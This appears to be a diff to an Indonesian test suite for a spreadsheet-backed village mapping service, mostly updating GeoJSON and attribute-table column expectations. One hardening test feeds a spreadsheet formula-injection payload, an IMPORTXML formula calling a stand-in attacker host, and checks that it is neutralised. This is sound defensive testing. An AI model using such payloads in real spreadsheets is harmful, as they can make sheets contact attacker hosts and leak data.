@@ -403,10 +403,10 @@ describe("Code.gs: penyimpanan idempoten dan pengamanan (hardening)", () => {
 
   it("menetralkan injeksi formula spreadsheet (=, +, -, @) dengan tanda kutip tunggal", () => {
     const L = buatLingkungan();
-    L.kirim(payload([rec("a", { judul: '=IMPORTXML("https://jahat.tld","//a")', namaLokal: "+SUM(A1:A2)" })]));
+    L.kirim(payload([rec("a", { judul: '=IMPORTXML("https://jahat.tld","//a")', deskripsi: "+SUM(A1:A2)" })]));
     const [kepala, baris] = L.tabData().baris;
     expect(baris[kepala.indexOf("Judul")]).toBe('\'=IMPORTXML("https://jahat.tld","//a")');
-    expect(baris[kepala.indexOf("Nama_Lokal")]).toBe("'+SUM(A1:A2)");
+    expect(baris[kepala.indexOf("Deskripsi")]).toBe("'+SUM(A1:A2)");
   });
 
   it("menolak foto yang melebihi batas 2 MB", () => {
@@ -649,34 +649,37 @@ describe("Code.gs: tabel atribut PRM-AID & automasi migrasi folder wilayah", () 
 
     const desa = desaJambi(L);
     const geoPt = L.isiGeojson(desa, "budi_sebaran_anggrek_november_2026.geojson")!.features[0].properties;
-    expect(Object.keys(geoPt)).toEqual(["label", "kategori", "keterangan", "url", "simbol"]);
+    expect(Object.keys(geoPt)).toEqual(["label", "lapisan", "elevasi_m", "keterangan", "corak", "url"]);
     expect(geoPt).toMatchObject({
       label: "Gereja Santo Petrus",
-      kategori: "Agama",
+      lapisan: "Lapisan 1",
       keterangan: "Gereja pusat desa",
-      simbol: "church.png"
+      corak: "Pin Merah"
     });
     expect(String(geoPt.url)).toMatch(/^https:\/\/drive\.test\//);
 
     const geoLn = L.isiGeojson(desa, "budi_jembatan_november_2026.geojson")!.features[0].properties;
-    expect(Object.keys(geoLn)).toEqual(["label", "panjang_m", "keterangan", "url", "warna"]);
+    expect(Object.keys(geoLn)).toEqual(["label", "lapisan", "panjang_m", "elevasi_m", "keterangan", "corak", "url"]);
     expect(geoLn).toEqual({
       label: "Jembatan Gantung Sungai",
+      lapisan: "Lapisan 1",
       panjang_m: 125,
+      elevasi_m: "",
       keterangan: "Jembatan penghubung dusun",
-      url: "",
-      warna: "#00BFFF"
+      corak: "Jingga jejak",
+      url: ""
     });
 
     const geoPg = L.isiGeojson(desa, "budi_hutan_lindung_november_2026.geojson")!.features[0].properties;
-    expect(Object.keys(geoPg)).toEqual(["label", "luas_ha", "keterangan", "url", "tepi", "warna"]);
+    expect(Object.keys(geoPg)).toEqual(["label", "lapisan", "luas_ha", "elevasi_m", "keterangan", "corak", "url"]);
     expect(geoPg).toEqual({
       label: "Hutan Lindung Adat",
+      lapisan: "Lapisan 1",
       luas_ha: 48.75,
+      elevasi_m: "",
       keterangan: "Kawasan lindung desa",
-      url: "",
-      tepi: "Transparent",
-      warna: "#02AD00"
+      corak: "Hijau zamrud",
+      url: ""
     });
   });
 
@@ -774,27 +777,55 @@ describe("Code.gs: tabel atribut PRM-AID & automasi migrasi folder wilayah", () 
       wkt: "POINT (102.1 -2.1)"
     });
 
-    const hasil = L.kirim(payload([poly, line, pt]));
+    const hasil = L.kirim(
+      payload([
+        poly,
+        line,
+        {
+          ...pt,
+          ...({
+            lapisanNama: "Inventarisasi Blok A",
+            elevasi: 640.23,
+            corak: "Pin Merah",
+            atributKustom: { "Kode Titik": "T-01", Kondisi: "Baik" }
+          } as Record<string, unknown>)
+        }
+      ])
+    );
     expect(hasil.sukses).toBe(true);
 
     const ss = [...L.spreadsheet.values()][0];
     const tabPolygon = ss.getSheetByName("Polygon");
     const tabLine = ss.getSheetByName("Line");
     const tabPoint = ss.getSheetByName("Point");
+    const tabLapisanAdmin = ss.getSheetByName("Lapisan_Inventarisasi Blok A");
 
     expect(tabPolygon).toBeTruthy();
     expect(tabLine).toBeTruthy();
     expect(tabPoint).toBeTruthy();
+    expect(tabLapisanAdmin).toBeTruthy();
 
-    // Verifikasi header tabel atribut
-    expect(tabPolygon?.baris[0]).toEqual(["label", "luas_ha", "keterangan", "url", "tepi", "warna"]);
-    expect(tabLine?.baris[0]).toEqual(["label", "panjang_m", "keterangan", "url", "warna"]);
-    expect(tabPoint?.baris[0]).toEqual(["label", "kategori", "keterangan", "url", "simbol"]);
+    // Verifikasi header tabel baru tanpa item kategori/biologi lama
+    expect(tabPolygon?.baris[0]).toEqual(["label", "lapisan", "luas_ha", "elevasi_m", "keterangan", "corak", "url"]);
+    expect(tabLine?.baris[0]).toEqual(["label", "lapisan", "panjang_m", "elevasi_m", "keterangan", "corak", "url"]);
+    expect(tabPoint?.baris[0]).toEqual(["label", "lapisan", "elevasi_m", "keterangan", "corak", "url"]);
+    expect(tabLapisanAdmin?.baris[0]).toEqual([
+      "ID_Data",
+      "Judul",
+      "Jenis_Geometri",
+      "Kode Titik",
+      "Kondisi",
+      "Elevasi_m",
+      "Panjang_Km",
+      "Luas_Ha",
+      "Koordinat_WKT",
+      "Tautan_Foto"
+    ]);
 
     // Verifikasi baris data yang dihasilkan
-    expect(tabPolygon?.baris[1]).toEqual(["Area Perkebunan Desa", 12.5, "Kebun pangan", "", "#000000", "#00B050"]);
-    expect(tabLine?.baris[1]).toEqual(["Jalan Utama", 1250, "Akses jalan warga", "", "#FF0000"]);
-    expect(tabPoint?.baris[1]).toEqual(["Masjid Raya", "Agama", "Tempat ibadah", "", "mosque.png"]);
+    expect(tabPolygon?.baris[1]).toEqual(["Area Perkebunan Desa", "Lapisan 1", 12.5, "", "Kebun pangan", "Hijau zamrud", ""]);
+    expect(tabLine?.baris[1]).toEqual(["Jalan Utama", "Lapisan 1", 1250, "", "Akses jalan warga", "Jingga jejak", ""]);
+    expect(tabPoint?.baris[1]).toEqual(["Masjid Raya", "Inventarisasi Blok A", 640.23, "Tempat ibadah", "Pin Merah", ""]);
   });
 
   it("memindahkan data yang dihapus ke folder Pencadangan_90_Hari, dapat memulihkan sebelum 90 hari, dan menghapus permanen setelah 90 hari", () => {
